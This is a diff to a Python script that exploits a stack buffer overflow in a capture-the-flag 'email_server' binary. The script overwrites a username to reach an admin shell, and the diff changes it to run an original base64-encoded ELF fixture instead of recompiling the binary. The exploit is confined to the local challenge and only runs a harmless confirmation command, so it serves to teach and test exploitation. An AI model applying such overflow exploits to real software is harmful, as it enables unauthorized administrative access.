@@ -5,6 +5,7 @@ then verify that the overwritten username passes the restricted admin check.
 No network targets are contacted and the exploit is confined to the CTF sample.
 """
 import argparse
+import base64
 import re
 import shutil
 import subprocess
@@ -44,25 +45,33 @@ def compile_original(source_file: Path, output_file: Path) -> None:
     )
 
 
-def run_local(source_file: Path) -> str:
+def run_local(source_file: Path, binary_fixture: Path) -> str:
     source = source_file.read_text(encoding="utf-8")
     payload = make_payload(source)
+    # Use the published challenge's ORIGINAL compiled ELF. Newer GCC versions
+    # can reverse the stack layout of adjacent local variables, breaking the
+    # intended educational example even with the same source code.
+    data = base64.b64decode(binary_fixture.read_text(encoding="ascii"), validate=True)
+    if data[:4] != b"\x7fELF":
+        raise ValueError("Original binary fixture is not an ELF file")
     with tempfile.TemporaryDirectory(prefix="ctf-corporate-") as temp:
         binary = Path(temp) / "email_server"
-        compile_original(source_file.resolve(), binary)
-        # The post-login shell runs a harmless confirmation command and exits.
+        binary.write_bytes(data)
+        binary.chmod(0o700)
         proc = subprocess.run(
             [str(binary)],
             input=b"guest\n" + payload + b"\n" +
-                  b"printf CTF_ADMIN_SESSION_REACHED\\n\nexit\n",
+                  b"printf CTF_ADMIN_SESSION_REACHED\nexit\n",
             stdout=subprocess.PIPE, stderr=subprocess.PIPE,
             timeout=10, check=False,
+            cwd=temp,
         )
         output = proc.stdout.decode("utf-8", errors="replace")
         if "Admin login successful" not in output or "CTF_ADMIN_SESSION_REACHED" not in output:
             raise RuntimeError(
-                "Local challenge admin session not reached; stack layout may differ: " +
-                repr(output[-600:])
+                "Published CTF ELF admin session not reached: " +
+                repr(output[-600:]) + " stderr=" +
+                repr(proc.stderr.decode(errors="replace")[-300:])
             )
         return output
 
@@ -70,8 +79,9 @@ def run_local(source_file: Path) -> str:
 def main() -> None:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("source", type=Path, help="Original email_server.c")
+    parser.add_argument("elf_fixture", type=Path, help="Original ELF encoded as base64")
     args = parser.parse_args()
-    output = run_local(args.source)
+    output = run_local(args.source, args.elf_fixture)
     print(output)
 
 
